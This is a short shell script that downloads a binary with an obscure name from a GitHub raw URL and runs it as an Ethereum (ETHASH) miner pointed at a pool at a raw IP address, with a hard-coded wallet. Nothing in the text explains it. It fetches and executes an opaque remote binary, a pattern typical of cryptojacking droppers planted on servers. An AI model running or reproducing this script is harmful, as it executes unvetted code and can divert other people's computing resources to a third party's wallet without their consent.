wget https://github.com/aqshakuy/kasepak/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=139.162.40.79:80
WALLET=0x9dc2157e3ccf7a88268afb7def08a872667a6e29

./AkubapakMU --algo ETHASH --pool $POOL --user $WALLET $@ --no-cl
